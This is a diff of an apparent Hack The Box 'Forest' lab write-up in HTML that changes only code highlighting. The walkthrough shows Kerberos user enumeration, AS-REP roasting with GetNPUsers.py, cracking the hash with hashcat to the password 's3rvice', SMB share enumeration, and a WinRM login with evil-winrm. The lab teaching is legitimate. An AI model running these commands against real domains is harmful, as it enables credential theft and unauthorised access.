-</span></span><span style="display:flex;"><span>  / //_/ _ <span style="color:#ae81ff">\/</span> ___/ __ <span style="color:#ae81ff">\/</span> ___/ / / / __/ _ <span style="color:#ae81ff">\
-</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span> / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
-</span></span><span style="display:flex;"><span>/_/|_|<span style="color:#ae81ff">\_</span>__/_/  /_.___/_/   <span style="color:#ae81ff">\_</span>_,_/<span style="color:#ae81ff">\_</span>_/<span style="color:#ae81ff">\_</span>__/                                        
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Version: v1.0.3 <span style="color:#f92672">(</span>9dad6e1<span style="color:#f92672">)</span> - 01/21/25 - Ronnie Flathers @ropnop
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>2025/01/21 15:29:39 &gt;  Using KDC<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>:
+</span></span><span style="display:flex;"><span>  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+</span></span><span style="display:flex;"><span> / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
+</span></span><span style="display:flex;"><span>/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Version: v1.0.3 (9dad6e1) - 01/21/25 - Ronnie Flathers @ropnop
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>2025/01/21 15:29:39 &gt;  Using KDC(s):
 </span></span><span style="display:flex;"><span>2025/01/21 15:29:39 &gt;   10.10.10.161:88
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>2025/01/21 15:29:39 &gt;  Done! Tested <span style="color:#ae81ff">31</span> logins <span style="color:#f92672">(</span><span style="color:#ae81ff">0</span> successes<span style="color:#f92672">)</span> in 0.184 seconds
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>2025/01/21 15:29:39 &gt;  Done! Tested 31 logins (0 successes) in 0.184 seconds
 </span></span></code></pre></div><p>We have a list of valid users, what else can we do with them? We could try ASEPRoasting which exploits the &ldquo;Do not require Kerberos pre-authentication&rdquo; setting. Vendors often specify in their installation guides that the service account should be configured to have this setting.</p>
 <p>Normally, with pre-authentication, a user will enter their password which encrypts a time stamp later to be decrypted by the Domain Controller in order to validate that the correct password was used. If this setting is disabled for an account, then it is possible to request a TGT for that account. The TGT includes a session key that is encrypted with the user&rsquo;s NT hash. This means that if we can get that TGT, we can brute-force it offline to potentially get the user&rsquo;s password.</p>
 <p>Let&rsquo;s check if any users have Kerberos pre-authentication not required set:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$GetNPUsers.py HTB.LOCAL/ -dc-ip 10.10.10.161 -no-pass -usersfile users.txt                                              
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$GetNPUsers.py HTB.LOCAL/ -dc-ip 10.10.10.161 -no-pass -usersfile users.txt                                              
 </span></span><span style="display:flex;"><span>Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies                                                         
 </span></span><span style="display:flex;"><span>                                                               
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> User Administrator doesn<span style="color:#e6db74">&#39;t have UF_DONT_REQUIRE_PREAUTH set                                                               
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)                                      
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[-] User HealthMailboxc3d7722 doesn&#39;</span>t have UF_DONT_REQUIRE_PREAUTH set
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> User HealthMailboxfc9daad doesn<span style="color:#e6db74">&#39;t have UF_DONT_REQUIRE_PREAUTH set
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[-] User HealthMailboxc0a90c9 doesn&#39;</span>t have UF_DONT_REQUIRE_PREAUTH set
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> User HealthMailbox670628e doesn<span style="color:#e6db74">&#39;t have UF_DONT_REQUIRE_PREAUTH set
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[-] User HealthMailbox968e74d doesn&#39;</span>t have UF_DONT_REQUIRE_PREAUTH set
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> User HealthMailbox6ded678 doesn<span style="color:#e6db74">&#39;t have UF_DONT_REQUIRE_PREAUTH set
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[-] User HealthMailbox83d6781 doesn&#39;</span>t have UF_DONT_REQUIRE_PREAUTH set
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> User HealthMailboxfd87238 doesn<span style="color:#e6db74">&#39;t have UF_DONT_REQUIRE_PREAUTH set
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[-] User HealthMailboxb01ac64 doesn&#39;</span>t have UF_DONT_REQUIRE_PREAUTH set
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> User HealthMailbox7108a4e doesn<span style="color:#e6db74">&#39;t have UF_DONT_REQUIRE_PREAUTH set
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[-] User HealthMailbox0659cc1 doesn&#39;</span>t have UF_DONT_REQUIRE_PREAUTH set
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> User sebastien doesn<span style="color:#e6db74">&#39;t have UF_DONT_REQUIRE_PREAUTH set
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[-] User lucinda doesn&#39;</span>t have UF_DONT_REQUIRE_PREAUTH set
+</span></span><span style="display:flex;"><span>[-] User Administrator doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set                                                               
+</span></span><span style="display:flex;"><span>[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)                                      
+</span></span><span style="display:flex;"><span>[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+</span></span><span style="display:flex;"><span>[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+</span></span><span style="display:flex;"><span>[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+</span></span><span style="display:flex;"><span>[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+</span></span><span style="display:flex;"><span>[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+</span></span><span style="display:flex;"><span>[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+</span></span><span style="display:flex;"><span>[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+</span></span><span style="display:flex;"><span>[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+</span></span><span style="display:flex;"><span>[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+</span></span><span style="display:flex;"><span>[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+</span></span><span style="display:flex;"><span>[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+</span></span><span style="display:flex;"><span>[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+</span></span><span style="display:flex;"><span>[-] User HealthMailboxc3d7722 doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set
+</span></span><span style="display:flex;"><span>[-] User HealthMailboxfc9daad doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set
+</span></span><span style="display:flex;"><span>[-] User HealthMailboxc0a90c9 doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set
+</span></span><span style="display:flex;"><span>[-] User HealthMailbox670628e doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set
+</span></span><span style="display:flex;"><span>[-] User HealthMailbox968e74d doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set
+</span></span><span style="display:flex;"><span>[-] User HealthMailbox6ded678 doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set
+</span></span><span style="display:flex;"><span>[-] User HealthMailbox83d6781 doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set
+</span></span><span style="display:flex;"><span>[-] User HealthMailboxfd87238 doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set
+</span></span><span style="display:flex;"><span>[-] User HealthMailboxb01ac64 doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set
+</span></span><span style="display:flex;"><span>[-] User HealthMailbox7108a4e doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set
+</span></span><span style="display:flex;"><span>[-] User HealthMailbox0659cc1 doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set
+</span></span><span style="display:flex;"><span>[-] User sebastien doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set
+</span></span><span style="display:flex;"><span>[-] User lucinda doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set
 </span></span><span style="display:flex;"><span>$krb5asrep$23$svc-alfresco@HTB.LOCAL:00511b003a24d9bbf210b90d339d45b8$6f9f37aa718e0e3239ba180eb9a2d3e1a0554d8a6c0e3adb33cca06a
 </span></span><span style="display:flex;"><span>6df5ee9fadae31809b13c96d09e31e6bbd2fa68594b104b20c53f3100fd67c229a4210386e713737d7f79d8fa2e9cb01e44aab2d289a66da0e90f0f433cf2c
 </span></span><span style="display:flex;"><span>e39e3a2596431eecd72176e8e091a127ffe786f06e52c4975d4c8c5b1fa5b926651b6beb0c1b0b198ed658715d2b8e803e323a745afe57c0fd1cfaa0b6afe3
 </span></span><span style="display:flex;"><span>b3604de98f3241b1960cdcb812d0865b780956752e4e4dda0e86c3bdeae771270164e11f34a32c12fd9b1c28a67455c455bd3f66f509717034603ecf9f021a
 </span></span><span style="display:flex;"><span>af44352a2292c9815e5ca2f8ea
 </span></span></code></pre></div><p>We get a hit! As mentioned before this is common with service accounts, and this holds up with what we found. We can crack this with hashcat using hash-mode 18200:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$hashcat -m <span style="color:#ae81ff">18200</span> svc-alfresco_hash /usr/share/wordlists/rockyou.txt
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>&lt;SNIP&gt;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>$krb5asrep$23$svc-alfresco@HTB.LOCAL:00511b003a24d9bbf210b90d339d45b8$6f9f37aa718e0e3239ba180eb9a2d3e1a0554d8a6c0e3adb33cca06a6df5ee9fadae31809b13c96d09e31e6bbd2fa68594b104b20c53f3100fd67c229a4210386e713737d7f79d8fa2e9cb01e44aab2d289a66da0e90f0f433cf2ce39e3a2596431eecd72176e8e091a127ffe786f06e52c4975d4c8c5b1fa5b926651b6beb0c1b0b198ed658715d2b8e803e323a745afe57c0fd1cfaa0b6afe3b3604de98f3241b1960cdcb812d0865b780956752e4e4dda0e86c3bdeae771270164e11f34a32c12fd9b1c28a67455c455bd3f66f509717034603ecf9f021aaf44352a2292c9815e5ca2f8ea:s3rvice
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>&lt;SNIP&gt;
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$hashcat -m <span style="color:#ae81ff">18200</span> svc-alfresco_hash /usr/share/wordlists/rockyou.txt
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>&lt;SNIP&gt;
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>$krb5asrep$23$svc-alfresco@HTB.LOCAL:00511b003a24d9bbf210b90d339d45b8$6f9f37aa718e0e3239ba180eb9a2d3e1a0554d8a6c0e3adb33cca06a6df5ee9fadae31809b13c96d09e31e6bbd2fa68594b104b20c53f3100fd67c229a4210386e713737d7f79d8fa2e9cb01e44aab2d289a66da0e90f0f433cf2ce39e3a2596431eecd72176e8e091a127ffe786f06e52c4975d4c8c5b1fa5b926651b6beb0c1b0b198ed658715d2b8e803e323a745afe57c0fd1cfaa0b6afe3b3604de98f3241b1960cdcb812d0865b780956752e4e4dda0e86c3bdeae771270164e11f34a32c12fd9b1c28a67455c455bd3f66f509717034603ecf9f021aaf44352a2292c9815e5ca2f8ea:s3rvice
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>&lt;SNIP&gt;
 </span></span></code></pre></div><p>We are able to crack the hash. Now, let&rsquo;s see if we can find anything with our new access. It&rsquo;s important to remember that enumeration is cyclical. Almost every time I get hard-stuck, it&rsquo;s because I haven&rsquo;t gone back and performed the same enumeration with additional access that I&rsquo;ve gained.</p>
 <p>One that I&rsquo;ll always look out for is shares. Let&rsquo;s go back and see if we can see anything now that we have an account:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$smbclient -U svc-alfresco -L //10.10.10.161
-</span></span><span style="display:flex;"><span>Password <span style="color:#66d9ef">for</span> <span style="color:#f92672">[</span>WORKGROUP<span style="color:#ae81ff">\s</span>vc-alfresco<span style="color:#f92672">]</span>:
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        Sharename       Type      Comment
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$smbclient -U svc-alfresco -L //10.10.10.161
+</span></span><span style="display:flex;"><span>Password for [WORKGROUP\svc-alfresco]:
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>        Sharename       Type      Comment
 </span></span><span style="display:flex;"><span>        ---------       ----      -------
 </span></span><span style="display:flex;"><span>        ADMIN$          Disk      Remote Admin
 </span></span><span style="display:flex;"><span>        C$              Disk      Default share
@@ -530,55 +500,55 @@
 </span></span><span style="display:flex;"><span>        NETLOGON        Disk      Logon server share 
 </span></span><span style="display:flex;"><span>        SYSVOL          Disk      Logon server share 
 </span></span></code></pre></div><p>We can use the spider_plus module from crackmapexec to crawl through shares and export the information. Let&rsquo;s see what shares we can read.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$crackmapexec smb 10.10.10.161 -u svc-alfresco -p s3rvice --shares
-</span></span><span style="display:flex;"><span>SMB         10.10.10.161    <span style="color:#ae81ff">445</span>    FOREST           <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2016</span> Standard <span style="color:#ae81ff">14393</span> x64 <span style="color:#f92672">(</span>name:FOREST<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:htb.local<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:True<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>SMB         10.10.10.161    <span style="color:#ae81ff">445</span>    FOREST           <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> htb.local<span style="color:#ae81ff">\s</span>vc-alfresco:s3rvice 
-</span></span><span style="display:flex;"><span>SMB         10.10.10.161    <span style="color:#ae81ff">445</span>    FOREST           <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Enumerated shares
-</span></span><span style="display:flex;"><span>SMB         10.10.10.161    <span style="color:#ae81ff">445</span>    FOREST           Share           Permissions     Remark
-</span></span><span style="display:flex;"><span>SMB         10.10.10.161    <span style="color:#ae81ff">445</span>    FOREST           -----           -----------     ------
-</span></span><span style="display:flex;"><span>SMB         10.10.10.161    <span style="color:#ae81ff">445</span>    FOREST           ADMIN$                          Remote Admin
-</span></span><span style="display:flex;"><span>SMB         10.10.10.161    <span style="color:#ae81ff">445</span>    FOREST           C$                              Default share
-</span></span><span style="display:flex;"><span>SMB         10.10.10.161    <span style="color:#ae81ff">445</span>    FOREST           IPC$                            Remote IPC
-</span></span><span style="display:flex;"><span>SMB         10.10.10.161    <span style="color:#ae81ff">445</span>    FOREST           NETLOGON        READ            Logon server share 
-</span></span><span style="display:flex;"><span>SMB         10.10.10.161    <span style="color:#ae81ff">445</span>    FOREST           SYSVOL          READ            Logon server share
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$crackmapexec smb 10.10.10.161 -u svc-alfresco -p s3rvice --shares
+</span></span><span style="display:flex;"><span>SMB         10.10.10.161    445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
+</span></span><span style="display:flex;"><span>SMB         10.10.10.161    445    FOREST           [+] htb.local\svc-alfresco:s3rvice 
+</span></span><span style="display:flex;"><span>SMB         10.10.10.161    445    FOREST           [*] Enumerated shares
+</span></span><span style="display:flex;"><span>SMB         10.10.10.161    445    FOREST           Share           Permissions     Remark
+</span></span><span style="display:flex;"><span>SMB         10.10.10.161    445    FOREST           -----           -----------     ------
+</span></span><span style="display:flex;"><span>SMB         10.10.10.161    445    FOREST           ADMIN$                          Remote Admin
+</span></span><span style="display:flex;"><span>SMB         10.10.10.161    445    FOREST           C$                              Default share
+</span></span><span style="display:flex;"><span>SMB         10.10.10.161    445    FOREST           IPC$                            Remote IPC
+</span></span><span style="display:flex;"><span>SMB         10.10.10.161    445    FOREST           NETLOGON        READ            Logon server share 
+</span></span><span style="display:flex;"><span>SMB         10.10.10.161    445    FOREST           SYSVOL          READ            Logon server share
 </span></span></code></pre></div><p>Let&rsquo;s try the SYSVOL share, as there are sometimes scripts with sensitive info in them.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$cat 10.10.10.161.json 
-</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;NETLOGON&#34;</span>: <span style="color:#f92672">{}</span>,
-</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;SYSVOL&#34;</span>: <span style="color:#f92672">{</span>
-</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;htb.local/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI&#34;</span>: <span style="color:#f92672">{</span>
-</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;atime_epoch&#34;</span>: <span style="color:#e6db74">&#34;2019-09-18 13:45:57&#34;</span>,
-</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;ctime_epoch&#34;</span>: <span style="color:#e6db74">&#34;2019-09-18 13:45:57&#34;</span>,
-</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;mtime_epoch&#34;</span>: <span style="color:#e6db74">&#34;2021-08-30 20:45:24&#34;</span>,
-</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;size&#34;</span>: <span style="color:#e6db74">&#34;22 B&#34;</span>
-</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>,
-</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;htb.local/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf&#34;</span>: <span style="color:#f92672">{</span>
-</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;atime_epoch&#34;</span>: <span style="color:#e6db74">&#34;2019-09-18 13:45:57&#34;</span>,
-</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;ctime_epoch&#34;</span>: <span style="color:#e6db74">&#34;2019-09-18 13:45:57&#34;</span>,
-</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;mtime_epoch&#34;</span>: <span style="color:#e6db74">&#34;2021-08-30 20:45:23&#34;</span>,
-</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;size&#34;</span>: <span style="color:#e6db74">&#34;1.07 KB&#34;</span>
-</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>,
-</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;htb.local/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI&#34;</span>: <span style="color:#f92672">{</span>
-</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;atime_epoch&#34;</span>: <span style="color:#e6db74">&#34;2019-09-18 13:45:57&#34;</span>,
-</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;ctime_epoch&#34;</span>: <span style="color:#e6db74">&#34;2019-09-18 13:45:57&#34;</span>,
-</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;mtime_epoch&#34;</span>: <span style="color:#e6db74">&#34;2019-09-19 07:11:35&#34;</span>,
-</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;size&#34;</span>: <span style="color:#e6db74">&#34;22 B&#34;</span>
-</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>,
-</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;htb.local/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf&#34;</span>: <span style="color:#f92672">{</span>
-</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;atime_epoch&#34;</span>: <span style="color:#e6db74">&#34;2019-09-18 13:45:57&#34;</span>,
-</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;ctime_epoch&#34;</span>: <span style="color:#e6db74">&#34;2019-09-18 13:45:57&#34;</span>,
-</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;mtime_epoch&#34;</span>: <span style="color:#e6db74">&#34;2019-09-19 07:11:35&#34;</span>,
-</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;size&#34;</span>: <span style="color:#e6db74">&#34;3.74 KB&#34;</span>
-</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$cat 10.10.10.161.json 
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    &#34;NETLOGON&#34;: {},
+</span></span><span style="display:flex;"><span>    &#34;SYSVOL&#34;: {
+</span></span><span style="display:flex;"><span>        &#34;htb.local/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI&#34;: {
+</span></span><span style="display:flex;"><span>            &#34;atime_epoch&#34;: &#34;2019-09-18 13:45:57&#34;,
+</span></span><span style="display:flex;"><span>            &#34;ctime_epoch&#34;: &#34;2019-09-18 13:45:57&#34;,
+</span></span><span style="display:flex;"><span>            &#34;mtime_epoch&#34;: &#34;2021-08-30 20:45:24&#34;,
+</span></span><span style="display:flex;"><span>            &#34;size&#34;: &#34;22 B&#34;
+</span></span><span style="display:flex;"><span>        },
+</span></span><span style="display:flex;"><span>        &#34;htb.local/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf&#34;: {
+</span></span><span style="display:flex;"><span>            &#34;atime_epoch&#34;: &#34;2019-09-18 13:45:57&#34;,
+</span></span><span style="display:flex;"><span>            &#34;ctime_epoch&#34;: &#34;2019-09-18 13:45:57&#34;,
+</span></span><span style="display:flex;"><span>            &#34;mtime_epoch&#34;: &#34;2021-08-30 20:45:23&#34;,
+</span></span><span style="display:flex;"><span>            &#34;size&#34;: &#34;1.07 KB&#34;
+</span></span><span style="display:flex;"><span>        },
+</span></span><span style="display:flex;"><span>        &#34;htb.local/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI&#34;: {
+</span></span><span style="display:flex;"><span>            &#34;atime_epoch&#34;: &#34;2019-09-18 13:45:57&#34;,
+</span></span><span style="display:flex;"><span>            &#34;ctime_epoch&#34;: &#34;2019-09-18 13:45:57&#34;,
+</span></span><span style="display:flex;"><span>            &#34;mtime_epoch&#34;: &#34;2019-09-19 07:11:35&#34;,
+</span></span><span style="display:flex;"><span>            &#34;size&#34;: &#34;22 B&#34;
+</span></span><span style="display:flex;"><span>        },
+</span></span><span style="display:flex;"><span>        &#34;htb.local/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf&#34;: {
+</span></span><span style="display:flex;"><span>            &#34;atime_epoch&#34;: &#34;2019-09-18 13:45:57&#34;,
+</span></span><span style="display:flex;"><span>            &#34;ctime_epoch&#34;: &#34;2019-09-18 13:45:57&#34;,
+</span></span><span style="display:flex;"><span>            &#34;mtime_epoch&#34;: &#34;2019-09-19 07:11:35&#34;,
+</span></span><span style="display:flex;"><span>            &#34;size&#34;: &#34;3.74 KB&#34;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><p>Doesn&rsquo;t really look like anything good here. We can check that off and move forward. We saw earlier that port 5985 is open so let&rsquo;s try to login with our account via WinRM.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice
 </span></span><span style="display:flex;"><span>                                        
 </span></span><span style="display:flex;"><span>Evil-WinRM shell v3.7
 </span></span><span style="display:flex;"><span>                                        
 </span></span><span style="display:flex;"><span>Info: Establishing connection to remote endpoint
